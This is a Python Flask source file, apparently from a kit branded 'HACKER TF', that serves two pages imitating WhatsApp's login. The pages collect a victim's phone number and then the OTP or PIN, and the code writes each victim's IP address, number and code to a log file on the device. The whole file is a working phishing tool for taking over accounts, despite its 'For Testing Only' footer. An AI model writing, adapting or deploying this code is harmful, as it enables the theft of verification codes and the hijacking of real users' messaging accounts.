from flask import Flask, request, session, redirect, render_template_string
import os

app = Flask(__name__)
app.secret_key = "whatsapp_clone_secret"
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

step1_html = """
<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Login - Step 1</title>
    <style>
        body { font-family: Arial; background: #e5ddd5; text-align: center; padding-top: 80px; }
        .box { background: white; padding: 30px; width: 350px; margin: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
        input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
        button { background: #25D366; color: white; font-weight: bold; border: none; cursor: pointer; }
        img { width: 80px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
        <h2>Enter Your Phone</h2>
        <form method="POST" action="/step2">
            <input type="text" name="phone" placeholder="Phone Number" required><br>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
"""

step2_html = """
<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Login - Step 2</title>
    <style>
        body { font-family: Arial; background: #e5ddd5; text-align: center; padding-top: 80px; }
        .box { background: white; padding: 30px; width: 350px; margin: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
        input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
        button { background: #25D366; color: white; font-weight: bold; border: none; cursor: pointer; }
        .footer { font-size: 12px; margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Enter OTP</h2>
        <form method="POST" action="/login">
            <input type="password" name="otp" placeholder="OTP or PIN" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
    <div class="footer">
        Made by HACKER TF - For Testing Only
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(step1_html)

@app.route('/step2', methods=['POST'])
def step2():
    session['phone'] = request.form.get('phone')
    return render_template_string(step2_html)

@app.route('/login', methods=['POST'])
def login():
    phone = session.get('phone', 'Unknown')
    otp = request.form.get('otp')
    ip = request.remote_addr

    log = f"""
[+] WhatsApp 2-Step Login
IP: {ip}
Phone: {phone}
OTP/PIN: {otp}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Logging in... please wait</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;32m" + "="*45)
    print("      Made by HACKER TF - WhatsApp 2-Step")
    print("="*45 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5400)